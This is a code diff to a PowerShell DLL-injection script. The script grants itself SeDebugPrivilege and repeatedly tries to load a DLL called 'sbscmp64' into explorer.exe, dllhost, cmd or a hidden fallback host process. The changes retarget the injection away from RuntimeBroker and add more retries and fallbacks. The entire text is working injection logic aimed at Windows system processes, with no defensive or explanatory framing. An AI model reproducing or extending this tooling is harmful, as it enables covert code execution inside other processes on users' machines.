@@ -668,9 +668,15 @@ function Test-ProcessHasDll {
     if (-not $proc) { return $false }
 
     try {
+        if ($script:InjectorTypeReady -and [Injector]::GetModuleBase($ProcessId, $DllPath) -ne [IntPtr]::Zero) {
+            return $true
+        }
+    } catch {}
+
+    try {
         return [bool](@($proc.Modules) | Where-Object { Test-DllPathMatch $_.FileName $DllPath })
     } catch {
-        return [bool]([Injector]::GetModuleBase($ProcessId, $DllPath) -ne [IntPtr]::Zero)
+        return $false
     }
 }
 
@@ -879,14 +885,6 @@ function Restart-RuntimeBrokerHost {
     Start-Sleep -Seconds 2
 }
 
-function Restart-RuntimeBrokerHost {
-    Write-Step 'Restarting RuntimeBroker host...' -Color Gray
-    Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 1
-    Start-Process $x -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
-    Start-Sleep -Seconds 2
-}
-
 function Get-ProcessesWithMystDll {
     param([string]$DllPath)
 
@@ -941,16 +939,6 @@ function Ensure-RuntimeBrokerAvailable {
         return $true
     }
 
-    Write-Step 'Waking RuntimeBroker via Settings shell...' -Color Gray
-    try {
-        Start-Process 'explorer.exe' 'ms-settings:' -ErrorAction SilentlyContinue | Out-Null
-        Start-Sleep -Seconds 3
-    } catch {}
-
-    if (Get-Process -Name $n -ErrorAction SilentlyContinue) {
-        return $true
-    }
-
     Write-Step 'Starting RuntimeBroker directly...' -Color Gray
     Start-Process $x -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
     Start-Sleep -Seconds 2
@@ -962,13 +950,20 @@ function Get-MystInjectionCandidates {
 
     $candidates = New-Object System.Collections.Generic.List[System.Diagnostics.Process]
 
-    foreach ($proc in @(Get-Process -Name $n -ErrorAction SilentlyContinue)) {
-        if (-not (Test-RuntimeBrokerHasDll -Process $proc -DllPath $DllPath)) {
+    foreach ($proc in @(Get-Process -Name 'explorer' -ErrorAction SilentlyContinue | Select-Object -First 1)) {
+        if (-not (Test-ProcessHasDll -ProcessId $proc.Id -DllPath $DllPath)) {
             $candidates.Add($proc)
         }
     }
 
-    foreach ($proc in @(Get-Process -Name 'explorer' -ErrorAction SilentlyContinue | Select-Object -First 1)) {
+    if ($script:MystFallbackHostPid) {
+        $fallback = Get-Process -Id $script:MystFallbackHostPid -ErrorAction SilentlyContinue
+        if ($fallback -and -not $fallback.HasExited -and -not (Test-ProcessHasDll -ProcessId $fallback.Id -DllPath $DllPath)) {
+            $candidates.Add($fallback)
+        }
+    }
+
+    foreach ($proc in @(Get-Process -Name 'dllhost' -ErrorAction SilentlyContinue | Select-Object -First 1)) {
         if (-not (Test-ProcessHasDll -ProcessId $proc.Id -DllPath $DllPath)) {
             $candidates.Add($proc)
         }
@@ -1053,17 +1048,22 @@ function Invoke-Sbscmp30LoadFromDisk {
     Enable-SeDebugPrivilege | Out-Null
     $injectDllPath = Get-NormalizedDllPath -DllPath $p
     $script:MystFallbackHostPid = $null
-    $maxInjectRetries = 6
+    $maxInjectRetries = 8
+
+    $fallback = Start-MystFallbackHost
+    if ($fallback) {
+        $script:MystFallbackHostPid = $fallback.Id
+    }
 
     for ($retry = 0; $retry -lt $maxInjectRetries; $retry++) {
-        Ensure-RuntimeBrokerAvailable | Out-Null
-
         $candidates = @(Get-MystInjectionCandidates -DllPath $p)
         if ($candidates.Count -eq 0) {
-            $fallback = Start-MystFallbackHost
-            if ($fallback) {
-                $script:MystFallbackHostPid = $fallback.Id
-                $candidates = @($fallback)
+            if (-not $script:MystFallbackHostPid) {
+                $fallback = Start-MystFallbackHost
+                if ($fallback) {
+                    $script:MystFallbackHostPid = $fallback.Id
+                    $candidates = @($fallback)
+                }
             }
         }
 
@@ -1079,18 +1079,13 @@ function Invoke-Sbscmp30LoadFromDisk {
                 Write-Step "sbscmp64 loaded in $($targetProc.ProcessName) PID $($targetProc.Id)" -Color Green
                 return $true
             }
-
-            if ($targetProc.ProcessName -eq $n) {
-                Stop-Process -Id $targetProc.Id -Force -ErrorAction SilentlyContinue
-                Start-Sleep -Seconds 1
-            }
         }
 
         Start-Sleep -Seconds 2
     }
 
     Write-Step 'Trying multi-process inject fallback...' -Color Gray
-    if ((Inject-DllIntoProcesses -DllPath $injectDllPath -ProcessNames @('explorer', 'RuntimeBroker', 'dllhost') -Label 'sbscmp64') -gt 0) {
+    if ((Inject-DllIntoProcesses -DllPath $injectDllPath -ProcessNames @('explorer', 'dllhost', 'cmd') -Label 'sbscmp64') -gt 0) {
         return $true
     }
 
